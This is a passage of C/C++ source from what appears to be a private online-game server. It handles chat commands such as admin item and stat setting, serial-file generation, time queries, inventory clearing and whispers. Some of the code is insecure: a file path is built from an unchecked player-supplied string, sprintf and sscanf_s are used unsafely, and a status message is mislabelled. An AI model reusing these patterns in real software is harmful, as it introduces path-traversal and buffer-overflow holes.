		else if (sscanf_s(p->Arg, "+item %d %d %d %d %d %d %d", &Item.Index, &Item.EF1, &Item.EFV1, &Item.EF2, &Item.EFV2, &Item.EF3, &Item.EFV3))
		{
			GiveItem(cId, &Item);

			SendClientMsg(cId, "Item %s %d %d %d %d %d %d criado com sucesso.", itemlistBuffer[Item.Index].Name, Item.EF1, Item.EFV1, Item.EF2, Item.EFV2, Item.EF3, Item.EFV3);
		
			return;
		}

		else if (sscanf_s(p->Arg, "+set name %16s", &Name))
		{
			strncpy(player->Name, Name, 16);
			strncpy(user->CharList.Name[nBuffer[cId].Ingame.LoggedMob], Name, 16);

			BYTE packet[108];

			BASE_GetCreateMob(cId, (BYTE*)&packet);
			GridMulticast(cId, player->TargetX, player->TargetY, (void*)&packet);

			SendCreateMob(cId, cId, 1);

			SendClientMsg(cId, "Nome %s setado.", player->Name);

			return;
		}

		INT32 nPoints = 0; char serial[90];

		if (sscanf_s(p->Arg, "+gerar %ld %[^\n]", &nPoints, &serial))
		{
			FILE* fs = NULL;

			char Diretorio[120];
			sprintf(Diretorio, "C://StoredData/Serial/%s.txt", serial);

			if (FileExist(Diretorio))
			{
				SendClientMessage(cId, "Serial já existente.");

				return;
			}

			fs = fopen(Diretorio, "w+");

			if (!fs)
			{
				SendClientMessage(cId, "Um erro ocorreu durante a criação do serial.");

				return;
			}

			fprintf(fs, "%d", nPoints);
			fclose(fs);

			SendClientMsg(cId, "Serial [%s] gerado com [%ld] nPs.", serial, nPoints);

			return;
		}

		else if (sscanf(p->Arg, "+set level %d", &nPoints))
		{
			if (nPoints < 0 || nPoints > 5000)
			{
				SendClientMsg(cId, "[%d] não é um nível válido.", nPoints);

				return;
			}

			SendClientMsg(cId, "Novo nível: [%d]", nPoints);

			player->bStatus.Level = nPoints;
			player->Status.Level = nPoints;

			SendScore(cId);
			SendEtc(cId);

			return;
		}

		else if (sscanf(p->Arg, "+set str %d", &nPoints))
		{
			if (nPoints < 0 || nPoints > 32000)
			{
				SendClientMsg(cId, "[%d] não é uma pontuação válida.", nPoints);

				return;
			}

			SendClientMsg(cId, "Nova pontuação em str: [%d]", nPoints);

			player->Status.Points[FORCA] = nPoints;
			player->bStatus.Points[FORCA] = nPoints;

			SendScore(cId);
			SendEtc(cId);

			return;
		}

		else if (sscanf(p->Arg, "+set con %d", &nPoints))
		{
			if (nPoints < 0 || nPoints > 32000)
			{
				SendClientMsg(cId, "[%d] não é uma pontuação válida.", nPoints);

				return;
			}

			SendClientMsg(cId, "Nova pontuação em con: [%d]", nPoints);

			player->Status.Points[CONST] = nPoints;
			player->bStatus.Points[CONST] = nPoints;

			SendScore(cId);
			SendEtc(cId);

			return;
		}

		else if (sscanf(p->Arg, "+set dex %d", &nPoints))
		{
			if (nPoints < 0 || nPoints > 32000)
			{
				SendClientMsg(cId, "[%d] não é uma pontuação válida.", nPoints);

				return;
			}

			SendClientMsg(cId, "Nova pontuação em str: [%d]", nPoints);

			player->Status.Points[DEXTE] = nPoints;
			player->bStatus.Points[DEXTE] = nPoints;

			SendScore(cId);
			SendEtc(cId);

			return;
		}

		else if (sscanf(p->Arg, "+set int %d", &nPoints))
		{
			if (nPoints < 0 || nPoints > 32000)
			{
				SendClientMsg(cId, "[%d] não é uma pontuação válida.", nPoints);

				return;
			}

			SendClientMsg(cId, "Nova pontuação em int: [%d]", nPoints);

			player->Status.Points[INTEL] = nPoints;
			player->bStatus.Points[INTEL] = nPoints;

			SendScore(cId);
			SendEtc(cId);

			return;
		}

		else if (sscanf(p->Arg, "+set learn %d", &nPoints))
		{
			player->Learn = nPoints;
			
			SendStats(cId);
			SendScore(cId);
			SendEtc(cId);

			return;
		}

		return;
	}
#pragma endregion

#pragma region COMANDOS_TEMPO
	else if (!strcmp(p->Cmd, "day"))
	{
		int day, mom;

		mom = now->tm_mon;
		day = now->tm_mday;

		char tmp[108];

		sprintf(tmp, "!#%02d %02d", day, mom);
		SendClientMessage(cId, tmp);

		return;
	}

	else if (!strcmp(p->Cmd, "nig"))
	{
		// Retorna o tempo para o pesadelo
		int hour, min, sec;
		char msg[60];

		hour = now->tm_hour;
		min = now->tm_min;
		sec = now->tm_sec;

		sprintf_s(msg, "!!%02d%02d%02d", hour, min, sec);
		SendClientMessage(cId, msg);

		return;
	}

	else if (!strcmp(p->Cmd, "time") || !strcmp(p->Cmd, "hora"))
	{
		if (!nP->Ingame.isAdmin)
			SendClientMsg(cId, "Nix Project - [%02d:%02d:%02d] [%02d/%02d/%04d].", now->tm_hour, now->tm_min, now->tm_sec, now->tm_mday, now->tm_mon + 1, now->tm_year + 1900);
		else
			SendClientMsg(cId, "Nix Project - [%d] [%02d:%02d:%02d] [%02d/%02d/%04d].", Servidor.OnlineCount, now->tm_hour, now->tm_min, now->tm_sec, now->tm_mday, now->tm_mon + 1, now->tm_year + 1900);

		return;
	}
#pragma endregion

#pragma region SND
	else if (!strcmp(p->Cmd, "snd"))
	{
		if (p->Arg[0])
		{
			strncpy(nBuffer[p->Header.ClientId].Ingame.SND, p->Arg, 48);

			sprintf(szTMP, "Mensagem enquanto ocupado: %s", p->Arg);

			SendClientMessage(p->Header.ClientId, szTMP);
		}
		else
			nBuffer[p->Header.ClientId].Ingame.SND[0] = 0x0;

		return;
	}
#pragma endregion

#pragma region TAB
	/*else if (!strcmp(p->Cmd, "tab"))
	{
		if (player->bStatus.Level < 9 && player->Equip[0].EFV2 < SEMIDEUS)
		{
			SendClientMessage(cId, "Possível ultilizar apenas a partir do level 10.");

			return;
		}

		if (p->Arg[0])
			strncpy(nBuffer[cId].Ingame.Tab, p->Arg, 26);
		else
			nBuffer[cId].Ingame.Tab[0] = 0x0;

		BYTE packet[108];

		BASE_GetCreateMob(cId, (BYTE*)&packet);
		GridMulticast(cId, player->TargetX, player->TargetY, (void*)&packet);

		SendCreateMob(cId, cId, 1);

		return;
	}*/
#pragma endregion

#pragma region CLEARINV
	else if (!strcmp(p->Cmd, "clearinv"))
	{
		SendClientMessage(cId, "Inventário limpo com sucesso.");

		unsigned long int price = GetCoinOnItens(player->Inventory);

		if (price)
		{
			if (player->Gold + price <= 2000000000)
				player->Gold += price;
			else
				player->Gold = 2000000000;

			SendClientSignalParm(cId, cId, 0x3AF, player->Gold);

			sendLog(INFO, cId, "%s %s usou 'clearinv' e recebeu %d de gold.", nP->Login, player->Name, price);
		}

		memset(&player->Inventory, 0x0, sizeof(st_Item) * 60);

		for (int i = 0; i < 60; i++)
			SendItem(cId, INVENTORY, i, &player->Inventory[i]);

		return;
	}
#pragma endregion

#pragma region RESPOSTA
	else if (!strcmp(p->Cmd, "r"))
	{
		int userId = nBuffer[cId].Ingame.userWhisper;

		if (!userId)
		{
			SendClientMessage(cId, "Este jogador não está conectado.");

			return;
		}

		if (user->Status != 22)
		{
			SendClientMessage(cId, "Este jogador não está conectado.");

			return;
		}

		if (user->AllStatus.Whisper)
		{
			SendClientMessage(cId, "Não é possível enviar mensagem para este personagem.");
			return;
		}

		// Checa se o usuário tem um SND
		if (nBuffer[userId].Ingame.SND[0])
			SendClientMessage(cId, nBuffer[userId].Ingame.SND);

		st_Mob *mob = GetMobFromIndex(userId);

		// Checa se o usuário digitou uma mensagem
		if (p->Arg[0])
		{
			strncpy(p->Cmd, player->Name, 16);
			Sendpack((BYTE*)p, userId, sizeof p334);
		}
		else
		{
			if (mob->GuildIndex)
				sprintf(szTMP, "[%s] %s Cidadania: %d Vítimas: %d", Guilds[mob->GuildIndex].GuildName, mob->Name, 0, nP->Chars[nP->Ingame.LoggedMob].KillCount);
			else 
				sprintf(szTMP, "%s Cidadania: %d Vítimas: %d", mob->Name, 0, nP->Chars[nP->Ingame.LoggedMob].KillCount);

			SendClientMessage(cId, szTMP);
		}
	}
#pragma endregion

#pragma region CARTA
	else
	{
		// Mensagem enviada para um personagem
		int userId = GetUserByName(p->Cmd);

		st_Mob *mob = GetMobFromIndex(userId);

		if (!userId || userId < 0 || userId > 750 || Users[userId].Status != 22)
		{
			SendClientMessage(cId, "Este jogador não está conectado.");

			return;
		}

		if (Users[userId].AllStatus.Whisper)
		{ // O usuário que tiver acessLevel > 0 poderá enviar mensagem mesmo com o whisper ativado
			SendClientMessage(cId, "Não é possível enviar mensagem para este personagem.");

			return;
		}

		// Seta o /r
		nP->Ingame.userWhisper = userId;
		nBuffer[userId].Ingame.userWhisper = cId;

		// Checa se o usuário tem um SND
		if (nBuffer[userId].Ingame.SND[0])
			SendClientMessage(cId, nBuffer[userId].Ingame.SND);

		// Checa se o usuário digitou uma mensagem
		if (p->Arg[0])
		{
			strncpy(p->Cmd, player->Name, 16);

			Sendpack((BYTE*)p, userId, sizeof p334);
		}
		else
		{
			if (mob->GuildIndex)
				sprintf(szTMP, "[%s] %s Cidadania: %d Vítimas: %d", Guilds[mob->GuildIndex].GuildName, mob->Name, 0, nBuffer[userId].Chars[nBuffer[userId].Ingame.LoggedMob].KillCount);
			else
				sprintf(szTMP, "%s Cidadania: %d Vítimas: %d", mob->Name, 0, nBuffer[userId].Chars[nBuffer[userId].Ingame.LoggedMob].KillCount);

			SendClientMessage(cId, szTMP);
		}
	}
#pragma endregion
}